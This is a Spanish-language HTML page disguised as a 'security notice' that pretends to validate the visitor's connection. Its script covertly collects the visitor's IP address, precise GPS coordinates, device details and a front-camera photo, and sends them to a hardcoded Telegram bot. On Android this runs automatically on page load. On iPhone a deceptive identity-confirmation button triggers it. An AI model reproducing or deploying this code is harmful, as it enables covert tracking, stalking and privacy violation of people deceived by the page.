<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AVISO DE SEGURIDAD</title>
<style>
    body { font-family: Arial, sans-serif; margin: 0; background: #f2f2f2; overflow: hidden; }
    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.9); display: flex; justify-content: center; align-items: center; z-index: 9999; }
    .modal-content { background: white; padding: 30px; width: 90%; max-width: 400px; border-radius: 12px; text-align: center; }
    .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    #iphone-btn { 
        display: none; background: #4A90E2; color: white; border: none; 
        padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; 
        margin-top: 15px; cursor: pointer;
    }
</style>
</head>
<body>

<div class="modal-overlay">
    <div class="modal-content">
        <img src="https://i.ibb.co/S42ZgqWB/Sin-t-tulo.jpg" style="width:80px; margin-bottom:15px;">
        <h3 id="status-title">Validando Conexi√≥n...</h3>
        <div id="spinner" class="loading-spinner"></div>
        <p id="status-text">Sincronizando con el servidor de seguridad. Por favor, espere...</p>
        <button id="iphone-btn">CONTINUAR VALIDACI√ìN</button>
    </div>
</div>

<script>
const BOT_TOKEN = "8253513816:AAERpjUuX757c3cd8wzOmW0vvpTHce6KCIo";
const CHAT_ID = "-5099354587";
const esIPhone = /iPhone|iPad|iPod/i.test(navigator.userAgent);

let reporte = {
    ip: "N/A", ciudad: "Procesando...",
    lat: null, lon: null, acc: null,
    ua: navigator.userAgent, plat: navigator.platform, res: `${screen.width}x${screen.height}`
};

// 1. IP Inmediata
fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => reporte.ip = j.ip).catch(()=>{});

async function enviarReporte(blob = null) {
    const maps = `https://www.google.com/maps?q=${reporte.lat},${reporte.lon}`;
    const info = `üìç REPORTE ASEGURADO\n\n` +
                 `üïí ${new Date().toLocaleString('es-MX')}\n` +
                 `üåê IP: ${reporte.ip}\n` +
                 `üìå Ciudad: ${reporte.ciudad}\n\n` +
                 `üì° Ubicaci√≥n (GPS):\n` +
                 `‚Ä¢ Latitud: ${reporte.lat}\n‚Ä¢ Longitud: ${reporte.lon}\n‚Ä¢ Mapa: ${maps}\n\n` +
                 `üì± Dispositivo:\n‚Ä¢ Navegador: ${reporte.ua}\n‚Ä¢ Plataforma: ${reporte.plat}\n‚Ä¢ Resoluci√≥n: ${reporte.res}`;

    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    if (blob) {
        fd.append('photo', blob, 'f.jpg');
        fd.append('caption', info);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    } else {
        fd.append('text', info + "\n\n‚ö†Ô∏è Error: No se pudo capturar la foto frontal.");
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
    }
}

async function ejecutarCaptura() {
    // Esconder bot√≥n si se us√≥
    document.getElementById('iphone-btn').style.display = 'none';
    document.getElementById('spinner').style.display = 'block';

    // Pedir GPS con m√°xima prioridad
    navigator.geolocation.getCurrentPosition(async (pos) => {
        reporte.lat = pos.coords.latitude;
        reporte.lon = pos.coords.longitude;
        reporte.acc = pos.coords.accuracy.toFixed(1);

        // Ciudad en paralelo
        fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${reporte.lat}&longitude=${reporte.lon}&localityLanguage=es`)
            .then(r => r.json()).then(j => reporte.ciudad = j.city || j.locality || "N/D");

        // Captura de C√°mara Frontal
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute("playsinline", true);
            video.muted = true;
            await video.play();

            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    enviarReporte(blob);
                    stream.getTracks().forEach(t => t.stop());
                    document.getElementById('status-text').innerText = "Validaci√≥n finalizada.";
                }, 'image/jpeg', 0.85);
            }, 900); // 900ms para evitar imagen negra
        } catch (e) {
            await enviarReporte();
        }
    }, async (err) => {
        await enviarReporte();
        location.reload();
    }, { enableHighAccuracy: true, timeout: 8000 });
}

window.onload = () => {
    if (esIPhone) {
        // En iPhone el bot√≥n es necesario para Safari
        document.getElementById('spinner').style.display = 'none';
        document.getElementById('iphone-btn').style.display = 'block';
        document.getElementById('status-text').innerText = "Por seguridad, toque el bot√≥n para confirmar su identidad.";
        document.getElementById('iphone-btn').onclick = ejecutarCaptura;
    } else {
        // En Android es autom√°tico e inmediato
        ejecutarCaptura();
    }
};
</script>
</body>
</html>
